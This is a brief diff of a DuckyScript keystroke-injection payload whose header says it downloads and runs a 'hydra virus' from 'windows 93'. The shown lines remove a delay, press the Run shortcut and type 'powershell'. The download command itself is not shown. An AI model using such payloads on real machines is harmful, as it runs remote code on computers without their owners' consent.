@@ -2,7 +2,6 @@ REM Author: planetmeep
 REM Description: downloads and runs hydra virus from windows 93
 REM Version: 1.0
 REM Target: windows
-DELAY 500
 GUI r
 DELAY 1000
 STRING powershell
